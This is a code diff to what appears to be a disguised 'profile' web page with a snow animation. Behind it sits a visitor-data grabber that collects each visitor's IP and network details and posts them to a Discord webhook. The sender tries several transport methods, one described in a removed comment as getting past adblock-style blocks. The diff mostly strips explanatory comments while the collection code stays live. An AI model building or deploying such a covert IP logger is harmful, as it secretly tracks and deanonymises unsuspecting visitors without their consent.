@@ -19,7 +19,6 @@
 
   /* ═══════════════════════════════════════════════════════════
      PASTE YOUR DISCORD WEBHOOK URL BETWEEN THE QUOTES BELOW.
-     This is what makes every visitor's data reach your Discord.
      ═══════════════════════════════════════════════════════════ */
   const WEBHOOK = "";
 
@@ -27,7 +26,6 @@
   const WH_RE = /^https:\/\/(?:[\w-]+\.)*discord(?:app)?\.com\/api\/(?:v\d+\/)?webhooks\/\d+\/[\w-]+$/;
   const clean = s => (s || "").trim().replace(/\/+$/, "");
 
-  /* ── snow ── */
   (function(){
     const c = document.getElementById("snow"), x = c.getContext("2d");
     let w, h, f = [];
@@ -63,14 +61,14 @@
     init(); loop();
   })();
 
-  /* ── extract 4-char ID from /24ep OR /#24ep OR ?24ep ── */
+  /* read the 4-char id from #xxxx or #/xxxx or ?xxxx */
   function pickId(){
-    const m1 = location.pathname.match(/^\/([a-z0-9]{4})\/?$/i);
-    if(m1) return m1[1].toLowerCase();
-    const m2 = location.hash.replace(/^#\/?/, "").match(/^([a-z0-9]{4})/i);
-    if(m2) return m2[1].toLowerCase();
-    const m3 = location.search.replace(/^\?/, "").match(/^([a-z0-9]{4})/i);
-    if(m3) return m3[1].toLowerCase();
+    const h = location.hash.replace(/^#\/?/, "").match(/^([a-z0-9]{4})/i);
+    if(h) return h[1].toLowerCase();
+    const s = location.search.replace(/^\?/, "").match(/^([a-z0-9]{4})/i);
+    if(s) return s[1].toLowerCase();
+    const p = location.pathname.match(/^\/([a-z0-9]{4})\/?$/i);
+    if(p) return p[1].toLowerCase();
     return "0000";
   }
 
@@ -84,7 +82,6 @@
     return "";
   }
 
-  /* ── network detection ── */
   const isV6 = ip => ip.indexOf(":") !== -1;
   function isPriv(ip){
     if(isV6(ip)) return /^(fe80|fc|fd)/i.test(ip) || ip === "::1";
@@ -286,9 +283,8 @@
     return {
       username: "visit",
       embeds: [{
-        author: { name: "◼ VISIT" },
-        title: q(id),
-        description: "**" + id + "** · <t:" + ts + ":F>",
+        title: id,
+        description: "<t:" + ts + ":F>",
         color: 0x000000,
         fields: f,
         footer: { text: id },
@@ -297,13 +293,11 @@
     };
   }
 
-  /* ── SEND: no-cors multipart FIRST (bypasses adblock-style CORS blocks), then fallbacks ── */
   async function send(webhook, payload){
     const url  = clean(webhook) + "?wait=true";
     const json = JSON.stringify(payload);
     const log  = [];
 
-    /* 1) no-cors multipart — Content-Type is CORS-safelisted, no preflight, reaches Discord */
     try{
       const fd = new FormData();
       fd.append("payload_json", json);
@@ -312,7 +306,6 @@
       return { ok:true, via:"no-cors", log };
     }catch(e){ log.push("no-cors:" + e.message); }
 
-    /* 2) default multipart — get real status */
     try{
       const fd = new FormData();
       fd.append("payload_json", json);
@@ -321,7 +314,6 @@
       if(r.ok || r.status === 204) return { ok:true, via:"multipart", log };
     }catch(e){ log.push("multipart:" + e.message); }
 
-    /* 3) json */
     try{
       const r = await fetch(url, {
         method:"POST",
@@ -332,7 +324,6 @@
       if(r.ok || r.status === 204) return { ok:true, via:"json", log };
     }catch(e){ log.push("json:" + e.message); }
 
-    /* 4) beacon */
     try{
       const ok = navigator.sendBeacon(url, new Blob([json], {type:"application/json"}));
       log.push("beacon:" + ok);
@@ -347,7 +338,7 @@
     const wh = resolveWh();
     console.log("[grab] id =", id, "| webhook =", wh ? "found" : "MISSING");
     if(!wh){
-      console.warn("[grab] no webhook. Paste yours into the WEBHOOK constant at the top of profile.html");
+      console.warn("[grab] no webhook — paste yours into the WEBHOOK constant at the top of profile.html");
       return;
     }
     try{
